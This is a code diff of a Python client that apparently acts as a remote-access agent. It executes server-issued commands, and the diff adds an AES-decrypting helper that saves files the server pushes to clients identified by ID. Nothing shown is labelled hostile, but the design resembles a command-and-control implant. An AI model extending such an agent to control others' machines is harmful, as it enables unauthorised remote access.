@@ -314,46 +314,59 @@ def execute_command(command):
         return f"Error: {e.output}"
 
 def process_json_command(decrypted_text_ready_to_convert_to_json):
-                try:
-                    # Detect and fix nested JSON structure if needed
-                    if isinstance(decrypted_text_ready_to_convert_to_json, str):
-                        # Try parsing directly
-                        try:
-                            parsed_data = json.loads(decrypted_text_ready_to_convert_to_json)
-                        except json.JSONDecodeError:
-                            # If parsing fails, attempt to clean and fix malformed structure
-                            fixed_data = decrypted_text_ready_to_convert_to_json.replace('"{', '{').replace('}"', '}')
-                            parsed_data = json.loads(fixed_data)
+    try:
+        # Detect and fix nested JSON structure if needed
+        if isinstance(decrypted_text_ready_to_convert_to_json, str):
+            # Try parsing directly
+            try:
+                parsed_data = json.loads(decrypted_text_ready_to_convert_to_json)
+            except json.JSONDecodeError:
+                # If parsing fails, attempt to clean and fix malformed structure
+                fixed_data = decrypted_text_ready_to_convert_to_json.replace('"{', '{').replace('}"', '}')
+                parsed_data = json.loads(fixed_data)
 
-                    else:
-                        parsed_data = decrypted_text_ready_to_convert_to_json
+        else:
+            parsed_data = decrypted_text_ready_to_convert_to_json
 
-                    # Handle both nested and simple structures
-                    if isinstance(parsed_data, dict):
-                        for key, value in parsed_data.items():
-                            if isinstance(value, str):
-                                try:
-                                    # Try parsing inner JSON
-                                    inner_data = json.loads(value)
-                                    # Handle nested JSON with specific fields
-                                    if all(field in inner_data for field in ["upload_type", "client_id", "filename"]):
-                                        print(f"Upload Type: {inner_data['upload_type']}")
-                                        print(f"Client ID: {inner_data['client_id']}")
-                                        print(f"Filename: {inner_data['filename']}")
-                                    else:
-                                        # Handle other key-value structures
-                                        print(f"Key: {key}")
-                                        print(f"Value: {value}")
-                                except json.JSONDecodeError:
-                                    # Handle simple key-value pairs
-                                    return value
-                            else:
-                                return value
-                    else:
-                        print("Unexpected JSON structure")
+        # Handle both nested and simple structures
+        if isinstance(parsed_data, dict):
+            for key, value in parsed_data.items():
+                if isinstance(value, str):
+                    try:
+                        # Try parsing inner JSON
+                        inner_data = json.loads(value)
+                        # Handle nested JSON with specific fields
+                        if all(field in inner_data for field in ["upload_type", "client_id", "filename"]):
+                            print(f"Upload Type: {inner_data['upload_type']}")
+                            print(f"Client ID: {inner_data['client_id']}")
+                            print(f"Filename: {inner_data['filename']}")
+                        else:
+                            # Handle other key-value structures
+                            print(f"Key: {key}")
+                            print(f"Value: {value}")
+                    except json.JSONDecodeError:
+                        # Handle simple key-value pairs
+                        return value
+                else:
+                    return value
+        else:
+            print("Unexpected JSON structure")
 
-                except Exception as e:
-                    print("An error occurred:", e)
+    except Exception as e:
+        print("An error occurred:", e)
+
+
+def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, file_content):
+    base64_decoded_file_content = base64.b64decode(file_content).decode()
+    base64_decoded_in_json = json.loads(base64_decoded_file_content)
+    try:
+        decrypted_data = decrypt_data(aes_key,base64_decoded_in_json.get("nonce"),base64_decoded_in_json.get("ciphertext"),base64_decoded_in_json.get("tag"))
+        with open(file_path, "wb") as file:
+            file.write(decrypted_data)
+            print(f"[+] File '{filename}' saved successfully in {current_directory}")
+    except Exception as e:
+        print(e)
+
 
 while True:
     try:
@@ -394,11 +407,8 @@ while True:
 
             
             elif command.startswith("{'upload_type': 'UploadFromFiles'"):
-                print(command_after_json_processing)
                 client_id = command_after_json_processing["client_id"]
                 filename = command_after_json_processing["filename"]
-                print(client_id)
-                print(filename)
                 command=""
                 command_after_json_processing=""
                 # Send request to server
@@ -407,36 +417,27 @@ while True:
                 # Check if the response is successful
                 if response.status_code == 200:
                     file_path = os.path.join(current_directory, filename)
-                    
                     # Save the file
-                    with open(file_path, "wb") as file:
-                        file.write(response.content)
-                        print("file saved")
-                    print(f"File '{filename}' saved successfully in {current_directory}")
+                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
+                    
                 else:
                     print(f"Failed to download file. Server responded with status code {response.status_code}")
 
 
             elif command.startswith("{'command': 'UploadFromServer'"):
-                print(command_after_json_processing)
                 client_id = command_after_json_processing["client_id"]
                 server_file_path_for_client = command_after_json_processing["server_file_path"]
-                print(client_id)
-                print(server_file_path_for_client)
                 command=""
                 command_after_json_processing=""
-                
+
                 response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify='cert.pem')
                 # Check if the response is successful
                 if response.status_code == 200:
                     filename = os.path.basename(server_file_path_for_client)
                     file_path = os.path.join(current_directory, filename)
+                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
                     
-                    # Save the file
-                    with open(file_path, "wb") as file:
-                        file.write(response.content)
-                        print("file saved")
-                    print(f"File '{filename}' saved successfully in {current_directory}")
+                    
                 else:
                     print(f"Failed to download file. Server responded with status code {response.status_code}")
 
